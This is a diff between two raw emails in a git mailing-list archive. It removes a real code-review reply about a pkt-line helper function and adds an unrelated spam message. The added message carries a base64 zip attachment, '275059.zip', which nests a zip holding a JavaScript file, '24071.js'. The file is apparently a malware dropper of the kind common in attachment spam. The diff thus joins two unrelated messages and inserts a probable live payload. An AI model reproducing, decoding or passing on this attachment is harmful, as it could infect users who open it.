@@ -2,140 +2,86 @@ Return-Path: <git-owner@vger.kernel.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on dcvr.yhbt.net
 X-Spam-Level: 
 X-Spam-ASN: AS31976 209.132.180.0/23
-X-Spam-Status: No, score=-3.3 required=3.0 tests=AWL,BAYES_00,
-	FREEMAIL_FORGED_FROMDOMAIN,FREEMAIL_FROM,HEADER_FROM_DIFFERENT_DOMAINS,
-	RCVD_IN_DNSWL_HI,RP_MATCHES_RCVD shortcircuit=no autolearn=ham
-	autolearn_force=no version=3.4.0
+X-Spam-Status: No, score=0.8 required=3.0 tests=BAYES_20,
+	HEADER_FROM_DIFFERENT_DOMAINS,RCVD_IN_DNSWL_HI,RP_MATCHES_RCVD,ZIPFILE
+	shortcircuit=no autolearn=no autolearn_force=no version=3.4.0
 Received: from vger.kernel.org (vger.kernel.org [209.132.180.67])
-	by dcvr.yhbt.net (Postfix) with ESMTP id 8AEB220966
-	for <e@80x24.org>; Thu, 30 Mar 2017 14:03:26 +0000 (UTC)
+	by dcvr.yhbt.net (Postfix) with ESMTP id E441220966
+	for <e@80x24.org>; Thu, 30 Mar 2017 14:36:19 +0000 (UTC)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S933996AbdC3ODY (ORCPT <rfc822;e@80x24.org>);
-        Thu, 30 Mar 2017 10:03:24 -0400
-Received: from mout.web.de ([212.227.15.4]:51281 "EHLO mout.web.de"
-        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-        id S933426AbdC3ODX (ORCPT <rfc822;git@vger.kernel.org>);
-        Thu, 30 Mar 2017 10:03:23 -0400
-Received: from [192.168.209.79] ([195.198.252.176]) by smtp.web.de (mrweb004
- [213.165.67.108]) with ESMTPSA (Nemesis) id 0M8L3a-1bz8VD393C-00vyoA; Thu, 30
- Mar 2017 16:03:17 +0200
-Subject: Re: [PATCH v2 1/2] pkt-line: add packet_writel() and
- packet_read_line_gently()
-To:     Ben Peart <Ben.Peart@microsoft.com>,
-        Ben Peart <peartben@gmail.com>,
-        "git@vger.kernel.org" <git@vger.kernel.org>
-References: <20170324152726.14632-1-benpeart@microsoft.com>
- <20170324152726.14632-2-benpeart@microsoft.com>
- <7a2c73c8-bb09-12ec-dd8d-99c5363f9bb4@web.de>
- <BL2PR03MB3233616BE57BB7D911B1AAEF4330@BL2PR03MB323.namprd03.prod.outlook.com>
-Cc:     "christian.couder@gmail.com" <christian.couder@gmail.com>,
-        "larsxschneider@gmail.com" <larsxschneider@gmail.com>
-From:   =?UTF-8?Q?Torsten_B=c3=b6gershausen?= <tboegi@web.de>
-Message-ID: <a5e259bd-d994-6ddb-9dae-43531ee2e875@web.de>
-Date:   Thu, 30 Mar 2017 16:04:09 +0200
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:45.0)
- Gecko/20100101 Thunderbird/45.8.0
+        id S933748AbdC3OgS (ORCPT <rfc822;e@80x24.org>);
+        Thu, 30 Mar 2017 10:36:18 -0400
+Received: from ip-178-46-130-38.adsl.surnet.ru ([178.46.130.38]:45098 "HELO
+        surnet.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S933165AbdC3OgR (ORCPT <rfc822;git@vger.kernel.org>);
+        Thu, 30 Mar 2017 10:36:17 -0400
+X-Greylist: delayed 300 seconds by postgrey-1.27 at vger.kernel.org; Thu, 30 Mar 2017 10:36:17 EDT
 MIME-Version: 1.0
-In-Reply-To: <BL2PR03MB3233616BE57BB7D911B1AAEF4330@BL2PR03MB323.namprd03.prod.outlook.com>
-Content-Type: text/plain; charset=windows-1252; format=flowed
-Content-Transfer-Encoding: 7bit
-X-Provags-ID: V03:K0:qpHunW1Dj1Mf+wJN88t3Uuz/KPe7uZCyno8xMrUQ0PIzLz2p2Ay
- 1Xn9pEzhvs8UF4epSb4rl4FacTK5/2S9r4Wn3u7+eNXiTjugTh9Ss3i8+xaxbKVwkdZSje6
- xOJrasNOAoWz57jzYPc6brLokLYMvcbJ7nckEc7apyxUcxfIcCv2lnohHgePZ0kD7XiJXNc
- koATsNFTDv3okeBbUCz7w==
-X-UI-Out-Filterresults: notjunk:1;V01:K0:77nvGcndefM=:bOvNwUM7n98SwGrbOs2BVe
- FVic/XX8z+X4rdIosFKTNmATqzMMZ/AdT9mhLhVv1OfzXLMhKg2h46jsNqZEJReV+AwZTue2V
- lC/4QkPbns9hs7Fl/xvEX73rlYt0SXUvFA3MGBY5fFlhnSk4UsDC/nQad1B4xGYKVBqqeQXY8
- NepLCUDooovgQqOq6wZfxhHl62DObyIVedFUyU3+MZ8hxpYx0Kg9j2xuyYGO33GMQsEP2d9NX
- joLsErp9i1KzVmo57cngX3fCEZUcfrPb9AbCz+xTmEIXUbg+XALKM4Aa78tHNyPQ2wWJOF5qu
- RaoP2O0C8R8ztHF2Qm3fYkuXI5GjrcoUUbkvOznA3GL+E8eFCC/9a9axcfEqH6C41D281mJXN
- ojCPIgt8FtZ8FGp73U2SGVYybI+MJ7QoHpjhRqkgXi6RLUkEIC7b31ku/acvFcurzSMRpXCXE
- YCVFVoB5TXkACZCksLHepPPEo0WqSKpFJv2leblM5V3Qy59NX+Y2wcMcblvJX/AQpGvC+8SZE
- hMl1YdoI326haLsTbdZ29Zr9WFmh9OWb73/wkiw/L+2KvkPyDFO20YBFuF+mDl6P/Sm3HvoHp
- HfIH91PPvJoXVsG+y54rX071ZxuQxOY7mlchPw2Uu5Hg0lFpdKqtrXGDxaRG+QJq1x4ArySh7
- 8AuYaUz4eJ5g5ZJZkyleaupeMNKyODdjGU6xcnYFEHXhCSpgK/KRLC9M3iraroGwcQEYy9WJ8
- tJ4BNz9YFT52AMLBXGQamGHHfXywUYJ8YqizQvpg1u63OAwPKfAO5H5nDdIpxpszXLvmrQu9g
- ymue963
+Subject: 23462 git
+Content-Transfer-Encoding: base64
+Content-Type: application/zip; name="275059.zip"
+From:   <richardprice@bjpinsure.com>
+Importance: High
+To:     "git" <git@vger.kernel.org>
+Content-Disposition: attachment
+Date:   Thu, 30 Mar 2017 14:36:11 -0000
+Reply-To: <richardprice@bjpinsure.com>
+Message-ID: <149088457181.21467.12441519661950787731@surnet.ru>
 Sender: git-owner@vger.kernel.org
 Precedence: bulk
 List-ID: <git.vger.kernel.org>
 X-Mailing-List: git@vger.kernel.org
 
-
-[snip]
->> Would packet_write_lines make more sense ?
->>
->
-> Just goes to prove that there are two hard things in computer science: cache invalidation, naming things, and off-by-one errors. :)  The feedback on V1 was:
->
-> "I am hesitant to take a function that does not take any "list"
-> type argument and yet calls itself "write_list".  IOW, I'd expect something like these
->
-> 	write_list(int fd, const char **lines);
-> 	write_list(int fd, struct string_list *lines);
->
-> given that name, and not "varargs, each of which is a line".  I am tempted to suggest
->
-> 	packet_writel(int fd, const char *line, ...);"
->
->>> +{
->>> +	va_list args;
->>> +	int err;
->>> +	va_start(args, line);
->>> +	for (;;) {
->>> +		if (!line)
->>> +			break;
->>> +		if (strlen(line) > LARGE_PACKET_DATA_MAX)
->>> +			return -1;
->>> +		err = packet_write_fmt_gently(fd, "%s\n", line);
->>> +		if (err)
->>> +			return err;
->>> +		line = va_arg(args, const char*);
->>> +	}
->>> +	va_end(args);
->>> +	return packet_flush_gently(fd);
->>> +}
->>> +
->> I don't think that this va_start() is needed, even if it works.
->>
->> int packet_write_line(int fd, const char *lines[])
->> |
->> 	const char *line = *lines;
->> 	int err;
->> 	while (line) {
->> 		if (strlen(line) > LARGE_PACKET_DATA_MAX)
->> 			return -1;
->> 		err = packet_write_fmt_gently(fd, "%s\n", line);
->> 		if (err)
->> 			return err;
->> 		lines++;
->> 		line = *lines;
->> 	}
->> 	return packet_flush_gently(fd);
->> ]
->>
->
-> This is a helper function to simply the common pattern of writing out a variable number of lines followed by a flush.  The usage of the function as currently implemented is:
->
-> packet_writel(fd, "line one", "line two", "line n");
-
-
-Does this work ?
-I would have expected
-packet_writel(fd, "line one", "line two", "line n"), NULL;
-
->
-> which requires the use of variable number of arguments.  With your proposal that convenience is lost as you have to create an array of strings and pass that instead.  The usage just isn't as simple as the current model.
->
-What is wrong with
-
-int packet_write_fmt_gently(int fd, const char *fmt, ...)
-and we use it like this:
-if packet_write_fmt_gently(fd, "%s%s%s", "line one", "line two", "line n")
-
-
-
-(Or do we need another one like)
-int packet_write_fmt_gently_flush(int fd, const char *fmt, ...)
-
-Sorry if I am lost here
+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
